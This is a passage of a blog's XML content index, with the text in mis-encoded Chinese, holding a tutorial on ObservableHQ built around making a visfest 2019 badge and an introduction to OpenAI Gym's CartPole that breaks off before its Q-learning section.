        <tag>ROS</tag>
        <tag>OpenCV</tag>
        <tag>ç‰©é«”è¾¨è­˜</tag>
        <tag>Object Recognition Kitchen</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾è£½ä½œ visfest 2019 badge èªè­˜ ObservableHQ</title>
    <url>/2019/09/09/observablehq-intro/</url>
    <content><![CDATA[å‰è¨€è»Ÿé«”å·¥ç¨‹å¸«æ‡‰è©²å¾ˆå°‘æ²’åƒåŠ é Conference å§ï¼Œä¸ç®¡æ˜¯ç¤¾ç¾¤æˆ–æ˜¯å­¸è¡“æ€§çš„ï¼Œåªè¦æ˜¯èˆ‡æœƒè€…éƒ½æœƒæ‹¿åˆ°ä¸€é¢ä¸»è¾¦æ–¹è£½ä½œçš„åç‰Œï¼Œä¸Šé¢é™¤äº†å°è‘—ä½ çš„å¤§åå¤–ï¼Œå¤§å¤šå°±å‰©ä¸‹ Conference åç¨±èˆ‡ Logo äº†ï¼Œç„¶è€Œï¼Œç”±ç£å€çš„è³‡æ–™è¦–è¦ºåŒ–ç¤¾ç¾¤æ‰€èˆ‰è¾¦çš„å¹´åº¦èšæœƒ - visfest unconf å¾ˆæ˜¯ç‰¹åˆ¥ï¼Œä»–å€‘æä¾›èˆ‡æœƒè€…ä¸€å€‹è£½ä½œè‡ªå·± badge çš„æ©Ÿæœƒï¼Œè®“å¤§å®¶è‡ªè¡Œç™¼æ®å‰µæ„ï¼Œç‰¹åˆ¥ä¹‹é¤˜ä¹Ÿå¾ˆç¬¦åˆæ•´å€‹æœƒè­°çš„èª¿æ€§ã€‚ä»Šå¹´å…«æœˆæ˜¯ä»–å€‘èˆ‰è¾¦çš„ç¬¬äº”å±† visfest unconfï¼Œé€™æ¬¡ä»–å€‘åœ¨ ObservableHQ é€™å€‹å¹³å°ä¸Šé‡‹å‡ºäº†ä¸€å€‹ Templateï¼Œè®“å¤§å®¶æ›´æ–¹ä¾¿çš„è£½ä½œåç‰Œï¼Œæ•ˆæœå¦‚åŒä¸‹æ–¹ï¼ˆå› ç‚ºç”¨åˆ° ECMAScript modulesï¼Œå»ºè­°ä½¿ç”¨æ¡Œé¢ç‰ˆ Chromeï¼‰ï¼Œè‹¥ç„¡æ³•è§€çœ‹ï¼Œå¯ä»¥å‰å¾€æ­¤ linkï¼Œæˆ–æ˜¯æ‹‰åˆ°æœ€ä¸‹é¢çœ‹ gifï¼š



  import notebook from "https://cors-anywhere.herokuapp.com/https://api.observablehq.com/@arvinh/visfest-unconf-badge-builder-template.js";

  const renders = {
    "result": "#animation",
  };

  import {Inspector, Runtime} from "https://unpkg.com/@observablehq/notebook-runtime@2?module";
  for (let i in renders)
    renders[i] = document.querySelector(renders[i]);

  Runtime.load(notebook, (variable) => {
    console.log(variable)
    if (renders[variable.name])
      return new Inspector(renders[variable.name]);
  });


é™¤äº† Observable èˆ‡ visfest çš„ Logo å¤–ï¼Œä½ å¯ä»¥ç¹ªè£½ä»»ä½•ä½ æƒ³å‘ˆç¾çš„æ±è¥¿ï¼Œæ”¹è®ŠèƒŒæ™¯é¡è‰²ç­‰ç­‰ï¼Œè€Œä¸»è¾¦æ–¹æœƒç”¨ gitpop é€™é …æœå‹™ï¼Œå°‡ä½ çš„å‹•ç•«è£½ä½œæˆ 10 frames çš„ gifï¼Œå› æ­¤åœ¨è£½ä½œæ™‚ï¼Œå¯ä»¥æ ¹æ“š template æä¾›çš„ç¹ªåœ–å‡½å¼å‚³å…¥çš„ frameNumbers ä¾†æ§åˆ¶å‹•ç•«çš„å‘ˆç¾ã€‚
æˆ‘è‡ªå·±æ˜¯è¦ºå¾—é€™æ¨£çš„æƒ³æ³•å¾ˆé…·ï¼Œæ‰€ä»¥å³ä¾¿ç„¡ç·£åƒåŠ  visfest unconfï¼Œä¹Ÿè£½ä½œäº†ä¸€å€‹è‡ªå·±çš„ Badge ç©ç©ï¼Œé †ä¾¿ä¾†è©¦ç”¨å·²ç¶“æƒ³ç©å¾ˆä¹…çš„å¹³å° ObservableHQï¼Œé€™ç¯‡æ–‡ç« å°±è¨˜éŒ„ä¸€ä¸‹ä½¿ç”¨çš„éç¨‹ï¼Œä¸¦èªªæ˜å…¶ç‰¹æ€§ï¼Œå¸Œæœ›èƒ½å¼•èµ·å¤§å®¶èˆˆè¶£ï¼
ObservableHQ èµ·æºD3.js çš„ä½œè€… @mbostockï¼Œåœ¨ 2017 å¹´çš„æ™‚å€™ç™¼äº†ä¸€ç¯‡åç‚º A Better Way to Code çš„æ–‡ç« ï¼Œä»‹ç´¹äº†ä»–ç•¶æ™‚æ­£åœ¨è£½ä½œçš„å°ˆæ¡ˆ - d3.expressï¼Œä¹Ÿå°±æ˜¯ç¾åœ¨çš„ ObservableHQã€‚

Mike Bostock åœ¨éå»åå¹´å·¦å³çš„æ™‚é–“éƒ½è‡´åŠ›æ–¼è³‡æ–™è¦–è¦ºåŒ–ï¼Œç‚ºäº†èƒ½å¤ æ›´æ–¹ä¾¿çš„å°‡è³‡æ–™ä»¥å„ç¨®æ–¹å¼å‘ˆç¾ï¼ŒD3.js å› æ‡‰è€Œç”Ÿï¼Œç„¶è€Œï¼Œè‡´åŠ›æ–¼ä¸€å€‹å·¥å…·å¤ªä¹…ï¼Œåè€Œå¿˜äº†ç•¶åˆç‚ºä½•è¦è£½ä½œå·¥å…·ï¼Œç›®çš„è®Šæˆäº†å·¥å…·æœ¬èº«ï¼Œè€Œä¸æ˜¯é€éè©²å·¥å…·æ‰€èƒ½å‚³é”çš„åƒ¹å€¼ã€‚

The purpose of visualization is insight, not pictures - Ben Shneiderman

è³‡æ–™è¦–è¦ºåŒ–çš„é‡é»æ‡‰åœ¨æ–¼å°‡è³‡æ–™çš„ insight æ›´åŠ è¼•æ˜“çš„å‚³éçµ¦ä¸–ç•Œï¼Œå„˜ç®¡ç¾åœ¨å·²ç¶“æœ‰å¾ˆå¤šåœ–å½¢åŒ–ä»‹é¢çš„æ‹–æ‹‰å·¥å…·è¼”åŠ©ä½ å°‡è³‡æ–™è¦–è¦ºåŒ–ï¼Œä½†è‹¥æ˜¯æƒ³è¦æœ€å¤§å¹…åº¦çš„è‡ªç”±å‰µä½œä¸¦è¡¨é” insightï¼Œæ’°å¯«ç¨‹å¼ç¢¼æ˜¯ç„¡å¯é¿å…çš„ã€‚
ç„¶è€Œå¯«ç¨‹å¼ä¸€ç›´éƒ½ä¸æ˜¯ä¸€ä»¶ç°¡å–®çš„äº‹ï¼Œç‚ºäº†é™ä½å¯«ç¨‹å¼çš„é›£åº¦ï¼Œä»–å‰µé€ äº†å¦ä¸€å€‹å·¥å…·ï¼šObservableHQã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³åƒæˆ JavaScript ç‰ˆæœ¬çš„ jupyter notebookï¼Œä½†ä½¿ç”¨ä¸ŠæŸäº›èªæ³•è·Ÿç´” JavaScript æœ‰äº›å·®ç•°ï¼Œå› æ­¤å‰›é–‹å§‹å¯èƒ½æœƒæœ‰äº›ä¸å¤ªç¿’æ…£çš„åœ°æ–¹ï¼Œç­‰åˆ°ä¸Šæ‰‹å¾Œï¼Œä½ å°±æœƒç™¼ç¾å®ƒçš„å¥½ç”¨ä¹‹è™•ï¼Œå°¤å…¶é©åˆæ‡‰ç”¨åœ¨è£½ä½œè³‡æ–™è¦–è¦ºåŒ–å°ˆæ¡ˆä¸Šã€‚
ObservableHQ åŸºç¤æ“ä½œObservableHQ å…¶å¯¦ä¸èƒ½ç®—æ˜¯ JavaScriptï¼Œå› ç‚ºæœ‰è¨±å¤šæ“ä½œè¡Œç‚ºèˆ‡ vanilla JavaScript ä¸ç›¸åŒï¼Œä½œè€…ä¹Ÿæœ‰å¯«äº†ä¸€ç¯‡èªªæ˜ã€‚
åŸºæœ¬ä¸Šï¼Œä½ å¯ä»¥æŠŠ ObservableHQ æƒ³åƒæˆä¸€å€‹è©¦ç®—è¡¨ï¼Œç”±ä¸€æ ¼ä¸€æ ¼çš„ cell æ‰€çµ„æˆï¼Œè€Œæ¯ä¸€æ ¼ cell éƒ½æ˜¯ä¸€å€‹ JavaScript snippetï¼Œå¯ä»¥æ˜¯ä¸€å‰‡é‹ç®—å¼ã€ä¸€æ®µç°¡çŸ­çš„å‡½å¼ï¼Œç•¶ç„¶ä¹Ÿå¯ä»¥å°‡å€¼æŒ‡å®šçµ¦ä¸€è®Šæ•¸åç¨±ã€‚

åœ¨ä¸Šé¢çš„åœ–ç‰‡ä¸­ï¼Œæ¯”è¼ƒä¸åŒçš„åœ°æ–¹åœ¨æ–¼é‹ç®—å‡½å¼çš„å¯«æ³•ï¼Œé™¤äº†ä¸€èˆ¬çš„ Function Declarations èˆ‡ Function Expressions å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ä¸€å€‹å¤§æ‹¬è™Ÿ &#123;&#125; åŒ…è£¹è‘—ä¸€æ®µç¨‹å¼ç¢¼ï¼Œæœ€å¾Œ return å‡ºå»çš„å€¼ï¼Œå°±æœƒè¢«å°å‡ºä¾†ã€‚
è€Œå°±åƒè©¦ç®—è¡¨çš„å…¬å¼ä¸€æ¨£ï¼Œè¡¨æ ¼å…§çš„å€¼æ˜¯äº’ç›¸ reference çš„ï¼Œåªè¦ä½ åœ¨æŸè™•ä¿®æ”¹äº†æŸå€‹ cell çš„å€¼ï¼Œæ‰€æœ‰å¼•ç”¨åˆ°è©² cell çš„ç¨‹å¼éƒ½æœƒç›¸æ‡‰æ”¹è®Šï¼ˆre-runï¼‰ï¼Œè·Ÿä¸€èˆ¬ vanilla JavaScript å¾ä¸Šåˆ°ä¸‹åŸ·è¡Œç¨‹å¼ç¢¼çš„é‚è¼¯æœ‰æ‰€ä¸åŒï¼š

å¾é€™é»ä¾†çœ‹ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠæ‰€æœ‰åœ¨ ObservableHQ ä¸Šçš„è®Šæ•¸ assignments éƒ½æƒ³æˆæ˜¯ hoisted declarationsï¼Œå› ç‚ºå®£å‘Šé †åºä¸å½±éŸ¿ referenceã€‚
æ­¤å¤–ï¼Œæ”¯æ´ä½¿ç”¨ html èˆ‡ markdown çš„èªæ³•ï¼Œåˆ©ç”¨ Template literals ä¾†å®Œæˆï¼š

é‚„æœ‰ä¸€å€‹ç‰¹åˆ¥çš„ built-in é‹ç®—å­ - viewofï¼š

å¦‚ä¸Šé¢çš„ gif æ‰€ç¤ºï¼Œviewof å¯ä»¥å°‡ä½¿ç”¨è€…é‡å°ä¸€å€‹ html input element æ“ä½œæ‰€ç”¢ç”Ÿçš„å€¼ï¼Œexposes å‡ºä¾†ï¼Œæˆ–æ˜¯ assign çµ¦ä¸€å€‹è®Šæ•¸ã€‚å¯ä»¥æƒ³è¦‹ï¼Œé€™ç”¨åœ¨äº’å‹•å¼è¦–è¦ºåŒ–å°ˆæ¡ˆä¸­æœƒæ˜¯å¾ˆæ£’çš„åŠŸèƒ½ã€‚
é€™å¹¾å€‹å¤§æ¦‚æ˜¯æœ€åŸºæœ¬çš„æ“ä½œï¼Œé‚„æœ‰å…¶ä»–è«¸å¦‚ï¼šå¦‚ä½•åŒ¯å…¥ç¬¬ä¸‰æ–¹å¥—ä»¶ã€ä½¿ç”¨éåŒæ­¥ API å‘¼å«ç­‰ç­‰ï¼Œæˆ‘å€‘å°±ç›´æ¥é€éå¯¦éš›æ¼”ç·´ä¾†å­¸ç¿’å§ï¼
ObservableHQ å¯¦éš›æ“ä½œæ¥ä¸‹ä¾†ç”¨æˆ‘é€™æ¬¡è£½ä½œçš„ visfest badge ä¾†åšç¯„ä¾‹ï¼Œé€²ä¸€æ­¥å¸¶å¤§å®¶èªè­˜é€™å€‹å·¥å…·ï¼
é€™æ¬¡çš„ badgeï¼Œä¸»è¦æ¦‚å¿µæ˜¯åœ¨ 2D åœ°çƒåœ–ä¸Šï¼Œé¡¯ç¤ºå„åŸå¸‚çš„äººå£æ•¸é‡ç´šåˆ¥ï¼Œç”¨åœ°çƒçš„è½‰å‹•èˆ‡ marker çš„ radius å¤§å°è®ŠåŒ–ä¾†å‘ˆç¾å‹•ç•«ã€‚
è¦å®Œæˆé€™å€‹ç›®æ¨™ï¼Œèµ·æ‰‹ç¬¬ä¸€æ­¥å°±æ˜¯å¾—å…ˆæŠŠ 2D åœ°çƒç•«å‡ºä¾†ã€‚è€Œ Mike Bostock æœ‰æä¾›ä¸€ä»½ topojson æ ¼å¼çš„ä¸–ç•Œåœ°åœ–è³‡æ–™ï¼šhttps://unpkg.com/world-atlas@1/world/110m.jsonã€‚
å› æ­¤ï¼Œæˆ‘å€‘éœ€è¦è¼‰å…¥ topojson å¥—ä»¶ï¼Œä¸¦ fetch ä¸–ç•Œåœ–è³‡ï¼Œè€Œåœ¨ ObservableHQ ä¸Šæˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š

é€™é‚Šæˆ‘å€‘ç”¨ require ä¾†è¼‰å…¥ topojson å¥—ä»¶ï¼Œä½†å…¶å¯¦å®ƒèƒŒå¾Œä¸¦é CommonJSï¼Œè€Œæ˜¯ç”¨ Asynchronous Module Definition (AMD) å¯¦ä½œã€‚å¦å¤–å®ƒä¹Ÿæ”¯æ´ ES modules èˆ‡ importsï¼Œæ‰€ä»¥å¯ä»¥ä¾ç…§ä½ æ‰€ä½¿ç”¨çš„å¥—ä»¶æ”¯æ´åº¦ä¾†é¸æ“‡è¦ç”¨å“ªç¨®æ–¹å¼è¼‰å…¥æ¨¡çµ„ã€‚
è‡³æ–¼å–å¾—ä¸–ç•Œåœ–è³‡ï¼Œæˆ‘å€‘éœ€è¦å…©å€‹æ­¥é©Ÿï¼š

å–å¾—åœ–è³‡ JSON æª”æ¡ˆï¼šlet world = await (await fetch(&quot;https://unpkg.com/world-atlas@1/world/110m.json&quot;)).json();
å–å¾—æ‹“æ¨¸å¾Œçš„è³‡æ–™ï¼štopojson.feature(world, world.objects.countries);

åœ¨ ObservableHQ ä¸Šï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨å…ˆå‰èªªåˆ°çš„å¤§æ‹¬è™Ÿ &#123;&#125; ä¾†åŸ·è¡Œå¤šè¡Œç¨‹å¼ç¢¼ï¼Œä¸¦æŠŠæœ€å¾Œ return çš„å€¼è³¦äºˆçµ¦æŸå€‹è®Šæ•¸ï¼š

æ¥è‘—é‚„éœ€è¦æœ‰å„åŸå¸‚çš„äººå£è³‡æ–™ï¼Œå–å¾—æ–¹å¼èˆ‡ä¸Šé¢ç›¸åŒï¼š

è³‡æ–™åˆ°æ‰‹å¾Œï¼Œå‰©ä¸‹çš„å°±å°±è·Ÿä¸€èˆ¬æ’°å¯« D3.js çš„å°ˆæ¡ˆã„§æ¨£ã€‚
åœ¨ visfest æä¾›çš„æ¨¡æ¿ä¸­ï¼Œæä¾›äº†è¨±å¤šä»¥å®šç¾©å¥½çš„è®Šæ•¸å®£å‘Šï¼Œåƒæ˜¯å§“åã€å­—é«”äº®åº¦ã€å¤§å°ç­‰ç­‰ï¼Œè€Œæˆ‘å€‘åªéœ€è¦åœ¨ badgeCode é€™å€‹å‡½æ•¸ä¸­å¯¦ä½œæˆ‘å€‘çš„è¦–è¦ºåŒ–ä½œå“å³å¯ã€‚
// Your D3 code goes here.// The function badgeCode gets called below to generate the previews.function badgeCode(g, c, frameNumber) &#123;  // g: a &lt;g&gt;, i.e. d3.select(... the node)  // context: a canvas context, useful for doing canvas drawing  // frameNumber: a number that represents the frame (1, 2, â€¦ 10) for psuedo-animation.  // width &amp; height are available via the environment, as is d3  // Note: the &lt;g&gt; is drawn on top of the &lt;canvas&gt;&#125;

badgeCode æ¥æ”¶ä¸‰å€‹åƒæ•¸ï¼Œä¸€å€‹æ˜¯åœ¨ badge ä¸Šç•™çµ¦ä½ ç¹ªåœ–çš„ç©ºé–“ &lt;g&gt; å…ƒç´ ï¼Œä»¥åŠ canvas context å’Œ frameNumberï¼Œè©²æ¨¡æ¿æœƒå‘¼å«æ­¤å‡½å¼åæ¬¡ï¼Œä¾åºå‚³å…¥éå¢çš„ frameNumberï¼Œè®“ä½ ä¾†æŒæ§å‹•ç•«éç¨‹ã€‚
åˆ°é€™é‚Šå¯èƒ½ä½ æœƒå¥½å¥‡ï¼Œåœ¨ ObservableHQ ä¸­çš„ æ¨¡æ¿ åˆ°åº•æ˜¯æ€éº¼é‹ä½œçš„ï¼Ÿç‚ºä»€éº¼èƒ½å®šç¾©å‡ºä¸€å€‹å‡½å¼ï¼Œè®“æˆ‘å»å¡«å¯«å…§å®¹ï¼Œåˆå¹«æˆ‘åŸ·è¡Œå‘¢ï¼Ÿ
ç­”æ¡ˆè¦è¿½ç©¶åˆ° ObservableHQ çš„ä¸€å€‹ç‰¹æ®Š import-with æ–¹æ³•ï¼š

b93171820ba3f268 æ˜¯ ObservableHQ ä¸Šçš„å¦ä¸€å€‹ notebookï¼Œä¹Ÿå°±æ˜¯å¯¦éš›çš„ template ç¨‹å¼ç¢¼æ‰€åœ¨ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥å¾è©² notebook ä¸­ import é€² &#123;preview, animation, download, width, height, d3&#125; é€™å¹¾å€‹å‡½å¼ä¾†å‘¼å«ä½¿ç”¨ï¼Œè€Œé€™å¹¾å€‹å‡½å¼ä¸­æ‰€ç”¨åˆ°çš„è®Šæ•¸ï¼Œæˆ‘å€‘èƒ½ä½¿ç”¨ with ä¾†å–å‡ºï¼Œä¸¦ä¸”è³¦äºˆå…¶æ–°çš„å€¼ï¼
é€™å°±æ˜¯ç‚ºä»€éº¼æˆ‘å€‘å¯ä»¥ä¿®æ”¹ firstNameã€lastName ä»¥åŠè‡ªè¡Œå¡«å…¥ badgeCode å‡½æ•¸çš„åŸå› äº†ã€‚
badgeCode å…§çš„ç¨‹å¼ç¢¼åŸºæœ¬ä¸Šå°±æ˜¯æ™®é€šçš„ D3.js ç¨‹å¼ï¼Œé€™é‚Šå°±ä¸å†é™„ä¸Šç¨‹å¼ç¢¼ï¼Œæœ‰èˆˆè¶£æƒ³çŸ¥é“æ€éº¼å¯¦ä½œåœ¨åœ°çƒå‘ˆç¾äººå£åˆ†å¸ƒçš„ï¼Œå¯ä»¥åˆ°æˆ‘çš„ notebook å»çœ‹ï¼Œå…¶ä¸­æˆ‘ä¹Ÿæœ‰ç”¨åˆ°å‰é¢æåŠçš„ viewof é‹ç®—å­ï¼Œè®“æˆ‘èƒ½æ‰‹å‹•èª¿æ•´åœ°çƒçš„ scale å¤§å°ã€‚
éƒ½å®Œæˆå¾Œå°±æœƒçœ‹åˆ°ç”±æ¨¡æ¿æä¾›çš„ preview å‡½å¼æ‰€ç¹ªè£½å‡ºçš„åå¼µåœ–ï¼š

ä»¥åŠç”¨ animation å‡½å¼ï¼ˆä¸€æ¨£æ¨¡æ¿æä¾›ï¼‰ç¹ªè£½çš„å‹•ç•«ï¼š

åˆ†äº«ä½ çš„ ObservableHQ ä½œå“å®Œæˆä½œå“å¾Œï¼Œæœ€é‡è¦çš„å°±æ˜¯åˆ†äº«ã€‚
é€™ç¯‡æ–‡ç« çš„æœ€ä¸Šæ–¹ï¼Œæˆ‘æ”¾å…¥çš„æˆå“ä¸¦ä¸æ˜¯ gifï¼Œè€Œæ˜¯è²¨çœŸåƒ¹å¯¦å¾ ObservableHQ æ‰€åŒ¯å…¥çš„ï¼Œåˆ©ç”¨ ECMAScript modulesï¼Œè¼‰å…¥æƒ³è¦åµŒå…¥çš„ notebookï¼Œæ¥è‘—å†è¼‰å…¥ ObservableHQ æä¾›çš„ &#123;Inspector, Runtime&#125;ï¼Œç•¶ notebook è¼‰å…¥å¾Œï¼Œå–å¾—å…¶ä¸­ export çš„è®Šæ•¸ï¼Œé€é Inspector å°‡å…¶ç¹ªè£½åˆ°æŒ‡å®šçš„ DOM id ä¸Šï¼š
&lt;div id=&quot;animation&quot;&gt;&lt;/div&gt;&lt;script type=&quot;module&quot;&gt;  import notebook from &quot;https://cors-anywhere.herokuapp.com/https://api.observablehq.com/@arvinh/visfest-unconf-badge-builder-template.js&quot;;  const renders = &#123;    &quot;result&quot;: &quot;#animation&quot;,  &#125;;  import &#123;Inspector, Runtime&#125; from &quot;https://unpkg.com/@observablehq/notebook-runtime@2?module&quot;;  for (let i in renders) &#123;    renders[i] = document.querySelector(renders[i]);  &#125;  Runtime.load(notebook, (variable) =&gt; &#123;    if (renders[variable.name]) &#123;      return new Inspector(renders[variable.name]);    &#125;  &#125;);&lt;/script&gt;

é€éé€™ç¨®æ–¹å¼ï¼Œé™¤äº†èƒ½å¤ åœ¨ ObservableHQ ä¸Šè¼‰å…¥å¼•ç”¨ä»–äººçš„ notebook å¤–ï¼Œä¹Ÿèƒ½åœ¨ä¸€èˆ¬ç¶²ç«™ä¸ŠåµŒå…¥ä»»ä½•ä½œå“ï¼Œéå¸¸æ–¹ä¾¿ï¼
çµè«–é€™ç¯‡æ–‡ç« åªæ˜¯éå¸¸ç°¡ç•¥çš„èªªæ˜äº† ObservableHQ çš„èµ·æºã€ç”¨é€”èˆ‡ä½¿ç”¨æ–¹å¼ï¼Œå¸Œæœ›èƒ½å¼•èµ·å¤§å®¶çš„èˆˆè¶£ï¼Œå¦‚æœæœ‰æƒ³è¦ä½¿ç”¨é€™å¥—å·¥å…·ç©ç©ï¼Œæˆ–æ˜¯è£½ä½œè¦–è¦ºåŒ–å°ˆæ¡ˆçš„è©±ï¼Œå®˜æ–¹ç¶²ç«™å…¶å¯¦æœ‰å‡ºäº†ä¸€ç³»åˆ—çš„æ•™å­¸èˆ‡èªªæ˜æ–‡ä»¶ï¼Œç›´æ¥å°±æ˜¯ç”¨ ObservableHQ çš„ notebook æ’°å¯«çš„ï¼Œäº’å‹•å¼çš„é–±è®€é«”é©—éå¸¸å¥½ï¼Œå¯ä»¥éå¸¸æ¸…æ¥šçš„çŸ¥é“å„å€‹ç’°ç¯€è©²æ€éº¼ä½¿ç”¨ï¼Œä»¥åŠå…¶èƒŒå¾Œçš„è¨­è¨ˆåŸç†ã€‚

è³‡æ–™ä¾†æº
Observablehq five minute intro
Observableâ€™s not JavaScript
Observablehq introduction

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>d3.js</tag>
        <tag>visualization</tag>
      </tags>
  </entry>
  <entry>
    <title>Open AI Gym ç°¡ä»‹èˆ‡ Q learning æ¼”ç®—æ³•å¯¦ä½œ</title>
    <url>/2017/11/04/openai-gym-intro-and-q-learning/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡æˆ‘å€‘ä¾†è·Ÿå¤§å®¶ä»‹ç´¹ä¸€ä¸‹ OpenAI Gymï¼Œä¸¦ç”¨è£¡é¢çš„ä¸€å€‹ç’°å¢ƒä¾†å¯¦ä½œä¸€å€‹ Q learning æ¼”ç®—æ³•ï¼Œé«”æœƒä¸€æ¬¡ reinforcement learning (ä»¥ä¸‹ç°¡ç¨± RL) çš„æ¦‚å¿µã€‚
OpenAI Gym æ˜¯ä¸€å€‹æä¾›è¨±å¤šæ¸¬è©¦ç’°å¢ƒçš„å·¥å…·ï¼Œè®“å¤§å®¶æœ‰ä¸€å€‹å…±åŒçš„ç’°å¢ƒå¯ä»¥æ¸¬è©¦è‡ªå·±çš„ RL æ¼”ç®—æ³•ï¼Œè€Œä¸ç”¨èŠ±æ™‚é–“å»æ­å»ºè‡ªå·±çš„æ¸¬è©¦ç’°å¢ƒã€‚
æŠŠ Gym è·‘èµ·ä¾†çš„æœ€ç°¡å–®ç¯„ä¾‹ä¸€é–‹å§‹å­¸ç¿’ï¼Œç¯„ä¾‹ç¸½æ˜¯è¶Šç°¡å–®è¶Šå¥½ï¼Œé€™æ¨£æ‰æœƒæœ‰é–‹å§‹ä¸Šæ‰‹çš„æˆå°±æ„Ÿã€‚
import gymenv = gym.make(&#x27;CartPole-v0&#x27;)env.reset()for _ in range(1000):	env.render()	env.step(env.action_space.sample()) # take a random action

åŸ·è¡Œé€™å€‹ .py æª”ä¹‹å¾Œï¼Œä½ æ‡‰è©²æœƒçœ‹åˆ°ä¸€å€‹éš¨ä¾¿äº‚å‹•çš„ cartpoleï¼Œç•«é¢ä¸€ä¸‹å°±æ¶ˆå¤±äº†ã€‚
åŸºæœ¬ä¸Šï¼ŒOpenAI Gym æä¾›äº†è¨±è¨±å¤šå¤šçš„ç’°å¢ƒï¼Œä½ å¯ä»¥å°‡ CartPole-v0 æ›æˆ MountainCar-v0ã€MsPacman-v0 (éœ€å®‰è£ Atari) æˆ–æ˜¯ Hopper-v1 (éœ€è¦å®‰è£ MuJoCo) ç­‰ç­‰ï¼Œä½ å¯ä»¥åœ¨ é€™é‚Š æ‰¾åˆ°æ›´å¤šç’°å¢ƒã€‚
ObservationRL çš„ä¸€å€‹é‡è¦æ­¥é©Ÿæ˜¯å–å¾—ç’°å¢ƒç‹€æ…‹ï¼Œåœ¨ Gym è£¡é¢ï¼Œç”± step function æä¾›ç’°å¢ƒç‹€æ…‹ã€‚step æœƒå›å‚³ 4 å€‹è®Šæ•¸ï¼Œåˆ†åˆ¥æ˜¯

observation (ç’°å¢ƒç‹€æ…‹)
reward (ä¸Šä¸€æ¬¡ action ç²å¾—çš„ reward )
done (åˆ¤æ–·æ˜¯å¦é”åˆ°çµ‚æ­¢æ¢ä»¶çš„è®Šæ•¸)
info ( debug ç”¨çš„è³‡è¨Š)

å¾å‘¼å« resetï¼Œæ•´å€‹ç’°å¢ƒå°±æœƒé‡é ­é–‹å§‹ï¼Œæ­¤å¤– reset æœƒå›å‚³ä¸€å€‹åˆå§‹çš„ç’°å¢ƒç‹€æ…‹ã€‚
import gym  env = gym.make(&#x27;CartPole-v0&#x27;)  for i_episode in range(1): #how many episodes you want to run	observation = env.reset() #reset() returns initial observation  	 for t in range(100):		 env.render()		 print(observation)		 action = env.action_space.sample()		 observation, reward, done, info = env.step(action)		 if done:			 print(&quot;Episode finished after &#123;&#125; timesteps&quot;.format(t+1))			 break

åŸ·è¡Œä¸Šé¢é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼Œä½ å°±æœƒçœ‹åˆ°æ¯ä¸€æ­¥æ”¶åˆ°çš„ç’°å¢ƒç‹€æ…‹ä¸æ–·åœ°è¢«å°åœ¨ terminalã€‚
Spaceé™¤äº† observation ä¹‹å¤–ï¼ŒRL ä¸­å¦ä¸€å€‹é‡é»å°±æ˜¯è¦å®šç¾©å¯ä»¥åšçš„ actionï¼Œé€™å…©è€…éƒ½ç”± space ä¾†å®šç¾©ã€‚
å¤§å®¶å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ç¨‹å¼ç¢¼ä¾†æŸ¥çœ‹ action space è·Ÿ observation spaceã€‚
import gymenv = gym.make(&#x27;CartPole-v0&#x27;)## Check dimension of spaces ##print(env.action_space)#&gt; Discrete(2)print(env.observation_space)#&gt; Box(4,)## Check range of spaces ##&quot;&quot;&quot;print(env.action_space.high)-You&#x27;ll get error if you run this, because &#x27;Discrete&#x27; object has no attribute &#x27;high&#x27;&quot;&quot;&quot;print(env.observation_space.high)print(env.observation_space.low)

æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ assign è‡ªå·±çš„ action spaceï¼Œåƒä¸‹ä¾‹ä¸­å°±æŠŠ action space è¨­æˆåªåŒ…å«ä¸€å€‹ actionï¼Œæ‰€ä»¥ agent å°±æ°¸é åªèƒ½æ¡å–åŒä¸€ç¨® actionï¼Œä½ çœ‹å¾—å‡ºä¾†æ˜¯å‘å·¦é‚„æ˜¯å‘å³å—ï¼Ÿ
import gymfrom gym import spaces  env = gym.make(&#x27;CartPole-v0&#x27;)env.action_space = spaces.Discrete(1) # Set it to only 1 elements &#123;0&#125;  for i_episode in range(5): #how many episodes you want to run	observation = env.reset() #reset() returns initial observation 	for t in range(200):		 env.render()		 print(observation)		 action = env.action_space.sample()		 observation, reward, done, info = env.step(action)		 if done:			 print(&quot;Episode finished after &#123;&#125; timesteps&quot;.format(t+1))			 break

ä¾†å­¸ç¿’ä¸€å€‹çœŸæ­£æœ‰å­¸ç¿’èƒ½åŠ›çš„æ¼”ç®—æ³• - Q-learningç¶“éä¸Šé¢çš„ä»‹ç´¹ï¼Œå¤§å®¶æ‡‰è©²å° Gym æœ‰äº†åŸºæœ¬çš„èªè­˜ï¼Œä¹Ÿè·Ÿ RL æœ€é‡è¦çš„ observation å’Œ action éŠœæ¥èµ·ä¾†äº†ã€‚æ¥ä¸‹ä¾†å°±æ˜¯ä»Šå¤©çš„é‡é ­æˆ²ï¼Œè®“æˆ‘å€‘ä¾†çœŸæ­£å¯¦ä½œä¸€å€‹æ¼”ç®—æ³•ä¾†å­¸è‘—ä¸è®“ pole å€’ä¸‹ä¾†ã€‚
é—œæ–¼ Q leanringï¼Œæ¨è–¦å¤§å®¶ç›´æ¥çœ‹é€™ä¸€å°æ®µ Q learning æ¼”ç®—æ³•ä»‹ç´¹ï¼Œçœ‹å®Œæ‡‰è©²å°±å¯ä»¥ç›´æ¥æ‡‚é€™å€‹æ¼”ç®—æ³•ï¼š

